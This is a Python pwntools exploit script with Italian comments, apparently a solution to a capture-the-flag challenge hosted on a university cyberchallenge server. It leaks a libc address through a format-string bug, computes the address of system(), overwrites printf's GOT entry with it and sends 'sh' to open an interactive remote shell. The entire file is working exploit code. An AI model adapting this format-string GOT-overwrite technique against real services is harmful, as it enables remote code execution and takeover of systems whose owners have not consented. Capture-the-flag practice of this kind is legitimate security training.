from pwn import *

HOST = 'cyberchallenge.disi.unitn.it'
PORT = 9030

elf  = ELF('./bin_pwn1')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

# Connessione
p = remote(HOST, PORT)

# step 1: leak address usando la format string
p.sendlineafter("What's your name?", "%7$p")  # o prova %x fino a trovare una libc address
leak = int(p.recvline().strip(), 16)
log.success(f"Leaked libc address: {hex(leak)}")

# step 2: calcola base di libc e indirizzo system()
libc_base = leak - libc.sym['__libc_start_main'] - 72
system_addr = libc_base + libc.sym['system']
printf_got = elf.got['printf']

log.info(f"Libc base: {hex(libc_base)}")
log.info(f"system(): {hex(system_addr)}")
log.info(f"printf@GOT: {hex(printf_got)}")

# step 3: usa format string per scrivere system in printf@GOT
payload = fmtstr_payload(6, {printf_got: system_addr})
p.sendline(payload)

# step 4: ora quando viene chiamato printf con un argomento "sh", verrà fatto system("sh")
p.sendline("sh")

p.interactive()
